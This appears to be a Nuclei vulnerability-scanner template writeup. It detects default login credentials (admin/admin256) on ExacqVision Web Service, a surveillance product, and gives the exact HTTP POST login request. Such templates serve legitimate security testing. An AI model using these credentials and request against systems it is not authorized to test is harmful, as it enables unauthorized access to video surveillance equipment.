# Nuclei Template: ExacqVision Default Login
**Template ID:** exacqvision-default-login
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`exacqvision-default-login.yaml`)

## Vulnerability Information & PoC

## Description
ExacqVision Web Service default login credentials (admin/admin256) were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /service.web HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close

action=login&u={{username}}&p={{password}}
```

## References
- https://cdn.exacq.com/auto/manspec/files_2/exacqvision_user_manuals/web_service/exacqVision_Web_Service_Configuration_User_Manual_(version%208.8).pdf
